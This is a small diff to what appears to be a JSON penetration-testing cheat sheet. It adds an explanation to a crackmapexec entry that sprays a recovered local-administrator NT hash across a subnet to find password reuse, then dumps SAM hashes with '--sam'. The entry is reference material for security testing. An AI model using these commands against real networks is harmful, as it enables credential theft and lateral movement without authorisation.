@@ -103,5 +103,6 @@
       "label": "Pwn3d! hosts = local admin -> dump creds",
       "command": "crackmapexec smb <host> --local-auth -u administrator -H <nt_hash> --sam"
     }
-  ]
+  ],
+  "explain": "Sprays a recovered local-admin hash across a subnet to find password reuse:\n  crackmapexec smb         SMB module\n  --local-auth             authenticate against the local SAM, not the domain\n  <cidr>                   the subnet to sweep\n  -u administrator -H <nt_hash>   the local admin account and its NT hash\n  | grep +                 keep only successful logins\nPwn3d! means local admin on that host; add --sam to dump its hashes. Essential after cracking any local admin password."
 }
